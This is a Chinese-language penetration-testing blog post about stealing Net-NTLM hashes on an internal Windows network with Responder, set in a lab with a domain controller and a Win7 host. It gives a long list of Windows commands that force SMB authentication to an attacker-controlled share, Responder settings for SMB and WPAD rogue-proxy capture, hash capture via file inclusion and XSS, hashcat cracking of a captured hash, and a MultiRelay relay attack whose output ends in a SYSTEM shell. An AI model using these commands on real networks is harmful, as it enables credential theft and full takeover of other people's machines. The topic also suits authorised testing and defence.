---
draft: false
date: 2018-09-10 09:48:10
lastmod: 2022-10-12 17:00:23
title: 内网渗透之 Responder 与 Net-NTLM hash
description: 在内网中利用 Responder 这个工具获取 Net-NTLM hash
categories:
  - Pentest
tags:
  - intranet
---

### 0x00 一些概念
* Windows 认证协议

    分为：基于 NTLM 的认证和基于 kerberos 的认证

* 什么是 NTLM Hash？

    早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash

* 什么是 Challenge-Response 挑战/响应验证机制？  
    * Client 输入 username、password、domain，然后将用户名及密码 hash 后存在本地，并将 username 发送到 DC
    * DC 生成一个 16 字节的随机数，即 Challenge(挑战码)，然后传回 Client
    * Client 收到 Challenge 后将密码 hash 和 challenge 混合 hash，混合后的 hash 称为 response，然后将 challenge、response 和 username 发送给 Server
    * Server 将收到的 3 个值转发给 DC，然后 DC 根据传过来的 username 到域控的账号数据库 ntds.list 找到对应的密码 hash，将 hash 和 Client 传过来的 challenge 混合 hash，将这个混合 hash 与 Client 传过来的 response 进行对比验证

* NTLM Hash 与 Net-NTLM Hash
    * NTLM Hash 通常是指 Windows 系统下 SAM 中保存的用户密码 hash，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件中获得所有用户的 hash（比如用 Mimikatz 提取），“挑战/响应验证”中的用户名及密码 hash 就是 NTLM Hash，可以用来进行 PtH、PtT 攻击
    * Net-NTLM Hash 通常是指网络环境下 NTLM 认证中的 hash，是基于用户密码的 NTLM Hash 计算出来的，“挑战/响应验证”中的 response 中包含 Net-NTLM hash，而用 Responder 抓取的就是 Net-NTLM Hash，可以用来做中继攻击

* 关于 Responder  
    由 Laurent Gaffie 撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括 Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如 SQL 服务器，FTP，HTTP 和 SMB 服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder 也有能力攻击 LLMNR，NBT-NS 和 mDNS 等协议。

* 什么是 NTLM 中继攻击？  
    Net-NTLM 中继攻击思路是让受害者把 Net-NTLM hash 发送给攻击者，然后攻击着拿着 Hash 访问远程服务  
    对于 SMB、HTTP、LDAP、MSSQL 等用 NTLM 进行认证的程序，都可以尝试用来向攻击者发送 Net-NTLM hash  
    比如 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 hash 尝试登录，  
    所以我们让目标访问 `\\your-vps-ip\aaa` 的话，他就会把 hash 发送到我们的 vps

### 0x01 软件环境
* 可以从[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder?_blank)下载Responder
* 被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段
* 域控主机：Win2008（10.11.11.5）用户 Administrator
* 域内主机：Win7（10.11.11.7）登录用户 zhangsan

### 0x02 通过 SMB 服务获取 Net-NTLM hash   
对于 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 hash 尝试登录，所以可以模拟 SMB 服务器从而截获 hash，执行如下命令都可以得到 hash

```bash
net.exe use \\host\share
attrib.exe \\host\share
bcdboot.exe \\host\share
bdeunlock.exe \\host\share
cacls.exe \\host\share
certreq.exe \\host\share #(noisy, pops an error dialog)
certutil.exe \\host\share
cipher.exe \\host\share
ClipUp.exe -l \\host\share
cmdl32.exe \\host\share
cmstp.exe /s \\host\share
colorcpl.exe \\host\share #(noisy, pops an error dialog)
comp.exe /N=0 \\host\share \\host\share
compact.exe \\host\share
control.exe \\host\share
convertvhd.exe -source \\host\share -destination \\host\share
Defrag.exe \\host\share
DeployUtil.exe /install \\host\share
DevToolsLauncher.exe GetFileListing \\host\share #(this one's cool. will return a file listing (json-formatted) from remote SMB share...)
diskperf.exe \\host\share
dispdiag.exe -out \\host\share
doskey.exe /MACROFILE=\\host\share
esentutl.exe /k \\host\share
expand.exe \\host\share
extrac32.exe \\host\share
FileHistory.exe \\host\share #(noisy, pops a gui)
findstr.exe * \\host\share
fontview.exe \\host\share #(noisy, pops an error dialog)
fvenotify.exe \\host\share #(noisy, pops an access denied error)
FXSCOVER.exe \\host\share #(noisy, pops GUI)
hwrcomp.exe -check \\host\share
hwrreg.exe \\host\share
icacls.exe \\host\share
LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)
licensingdiag.exe -cab \\host\share
lodctr.exe \\host\share
lpksetup.exe /p \\host\share /s
makecab.exe \\host\share
MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)
mshta.exe \\host\share #(noisy, pops an HTA window)
msiexec.exe /update \\host\share /quiet
msinfo32.exe \\host\share #(noisy, pops a "cannot open" dialog)
mspaint.exe \\host\share #(noisy, invalid path to png error)
mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)
msra.exe /openfile \\host\share #(noisy, error)
mstsc.exe \\host\share #(noisy, error)
netcfg.exe -l \\host\share -c p -i foo
```
* 攻击机配置开启 SMB 后执行：$ sudo python Responder.py -I eth0 -v
![90](/img/post/Xnip2020-12-11_11-02-33.png)

### 0x03 通过 web 漏洞获取 Net-NTLM hash
前提：同样是开启 SMB 服务，然后执行 sudo python Responder.py -I eth0 -v

* 通过文件包含获取(获取到的是 Administrator 的 hash)
![90](/img/post/Xnip2020-12-11_11-39-10.png)

* 通过 XSS 获取(获取到的是 zhangsan 的 hash)(只有 IE 和 edge 能行)
![80](/img/post/Xnip2020-12-11_11-46-56.png)

### 0x04 WPAD 代理服务器抓取 Net-NTLM hash
WPAD 用于在 windows 中自动化的设置 ie 浏览器的代理，从 Windows 2000 开始该功能被默认开启。

开启 Responder 的 WPAD 后，当 PC 浏览网站时即可抓取到 NET-NTLM hash。

* 参数说明

```
-w, --wpad            Start the WPAD rogue proxy server. Default value is False
-F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default: False

加 -w on 参数即可开启 WPAD 抓取 hash
```

* 配置(开启 http 和 https)

```bash
➜  Responder git:(master) ✗ head -n 16 Responder.conf
[Responder Core]

; Servers to start
SQL = Off
SMB = Off
RDP = Off
Kerberos = Off
FTP = Off
POP = Off
SMTP = Off
IMAP = Off
HTTP = On
HTTPS = On
DNS = Off
LDAP = Off
```

* 攻击机执行：$ sudo python Responder.py -I eth0 -v -w on -F on
![90](/img/post/Xnip2020-12-11_14-28-15.png)

### 0x05 使用hashcat解密
* 安装hashcat(参考[这里](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank))

```bash
$ git clone https://github.com/hashcat/hashcat.git
$ mkdir -p hashcat/deps
$ git clone https://github.com/KhronosGroup/OpenCL-Headers.git hashcat/deps/OpenCL
$ cd hashcat
$ make
$ ./example0.sh
$ ./hashcat
```

* 利用hashcat暴力猜解密码  
-m：hash-type，5600对应NetNTLMv2
![80](/img/post/20180912-232838.png)
得到密码为123456
![80](/img/post/20180912-233101.png)

### 0x06 利用 Responder 的 MultiRelay 进行中继攻击(鸡肋)
NTLM 中继攻击：将高权限主机的 NET-NTLM hash 转发给低权限主机(只能 Relay 未开启 SMB 签名的主机)

比如 Relay 域控的 NET-NTLM hash 到域内主机，从而获取域内主机的权限

* 首先查找未开启 SMB 签名的主机
![70](/img/post/Xnip2020-12-11_15-23-09.png)

* 修改 Responder.conf，关闭 SMB 和 HTTP，然后启动 Responder

```bash
➜  Responder git:(master) ✗ head -n 16 Responder.conf
[Responder Core]

; Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = Off
DNS = On
LDAP = On
```
```bash
➜  Responder git:(master) ✗ sudo python Responder.py -I eth0 -v
```

* 利用 Responder 的 MultiRelay 模块获取 shell

运行 MultiRelay 后，高权限主机随便执行 net use 即可，比如执行 net use \\\\aaa

```ini
➜  tools git:(master) ✗ sudo python MultiRelay.py -t 10.11.11.7 -u ALL

Responder MultiRelay 2.0 NTLMv1/2 Relay

Send bugs/hugs/comments to: laurent.gaffie@gmail.com
Usernames to relay (-u) are case sensitive.
To kill this script hit CTRL-C.

/*
Use this script in combination with Responder.py for best results.
Make sure to set SMB and HTTP to OFF in Responder.conf.

This tool listen on TCP port 80, 3128 and 445.
For optimal pwnage, launch Responder only with these 2 options:
-rv
Avoid running a command that will likely prompt for information like net use, etc.
If you do so, use taskkill (as system) to kill the process.
*/

Relaying credentials for these users:
['ALL']


Retrieving information for 10.11.11.7...
SMB signing: False
Os version: 'Windows 7 Professional 7601 Service Pack 1'
Hostname: 'WIN7'
Part of the 'TEST' domain
[+] Setting up SMB relay with SMB challenge: fb5db119d38f2d0d
[+] Received NTLMv2 hash from: 10.11.11.5
[+] Client info: ['Windows Server 2008 R2 Enterprise 7600', domain: 'TEST', signing:'True']
[+] Username: Administrator is whitelisted, forwarding credentials.
[+] SMB Session Auth sent.
[+] Looks good, Administrator has admin rights on C$.
[+] Authenticated.
[+] Dropping into Responder's interactive shell, type "exit" to terminate

Available commands:
dump               -> Extract the SAM database and print hashes.
regdump KEY        -> Dump an HKLM registry key (eg: regdump SYSTEM)
read Path_To_File  -> Read a file (eg: read /windows/win.ini)
get  Path_To_File  -> Download a file (eg: get users/administrator/desktop/password.txt)
delete Path_To_File-> Delete a file (eg: delete /windows/temp/executable.exe)
upload Path_To_File-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\
runas  Command     -> Run a command as the currently logged in user. (eg: runas whoami)
scan /24           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to
pivot  IP address  -> Connect to another host (eg: pivot 10.0.0.12)
mimi  command      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)
mimi32  command    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)
lcmd  command      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)
help               -> Print this message.
exit               -> Exit this shell and return in relay mode.
                      If you want to quit type exit and then use CTRL-C

Any other command than that will be run as SYSTEM on the target.

Connected to 10.11.11.7 as LocalSystem.
C:\Windows\system32\:#whoami
nt authority\system

C:\Windows\system32\:#
```



#### Reference(侵删)：
* [https://apt404.github.io/2016/08/11/ntlm-kerberos](https://apt404.github.io/2016/08/11/ntlm-kerberos?_blank)
* [http://www.4hou.com/system/9383.html](http://www.4hou.com/system/9383.html?_blank)
* [https://3gstudent.github.io/Windows下的密码NTLM-hash和Net-NTLM-hash介绍](https://3gstudent.github.io/Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍/?_blank)
* [https://gist.github.com/anonymous/70f792d50078f0ee795d39d0aa0da46e](https://gist.github.com/anonymous/70f792d50078f0ee795d39d0aa0da46e?_blank)
* [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes?_blank)
* [https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745](https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745?_blank)
* [https://www.anquanke.com/post/id/85004](https://www.anquanke.com/post/id/85004?_blank)
* [https://www.anquanke.com/post/id/193493](https://www.anquanke.com/post/id/193493)
* [https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank)